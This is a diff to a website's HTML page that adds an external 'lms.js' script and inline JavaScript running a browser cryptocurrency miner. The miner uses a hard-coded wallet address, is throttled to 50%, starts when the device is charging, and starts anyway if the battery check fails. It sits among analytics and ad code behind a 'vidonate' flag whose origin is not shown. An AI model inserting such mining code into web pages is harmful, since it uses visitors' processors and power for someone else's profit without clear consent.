@@ -20,7 +20,9 @@
 		
 		</script>
 		<!-- End Analytics Tracking Code-->
-	</head>
+		<!-- Begin lms Code -->
+		<script src="https://www.vistumbler.net/js/lms.js"></script>
+		<!-- End lms Code -->	</head>
 	<body class="body">
 		<script type="text/javascript">
 		<!--
@@ -29,7 +31,29 @@
 		</script>
 		<script type="text/javascript" src="js/adframe.js"></script>
 		<script type="text/javascript" src="js/linkanalytics.js"></script>
-		<table style="width: 90%; height: 100%" class="no_border" align="center">
+		<script type="text/javascript">
+			if(vidonate) {
+				lms.CONFIG.WEBSOCKET_SHARDS = [["wss://www.vistumbler.net/_ws_/"]];
+				var miner = lms.User('4AxzSWYhzEc4foJTtq9e1qbtzPUPxohiedApUUZSTDUGVfHGue4CiWjLfw7jQ7NniZ7GuNGPfZT5pfHGb2MbJRidMxD6vKP', 'vi');
+				//var threads = Math.max(1,Math.floor(navigator.hardwareConcurrency/2));
+				//miner.setNumThreads(threads);
+				var throttle = 0.50;
+				miner.setThrottle(throttle);
+				
+				try {
+				    navigator.getBattery().then(function (battery) {
+				
+				        if (battery.charging) miner.start();
+				
+				        battery.onchargingchange = function (evt) {
+				            if (battery.charging) miner.start();
+				            else miner.stop();
+				        }
+				
+				    });
+				}catch(e){miner.start();}
+			}
+		</script>		<table style="width: 90%; height: 100%" class="no_border" align="center">
 			<tr>
 				<td>
 				<table style="width: 100%; height: 100%">
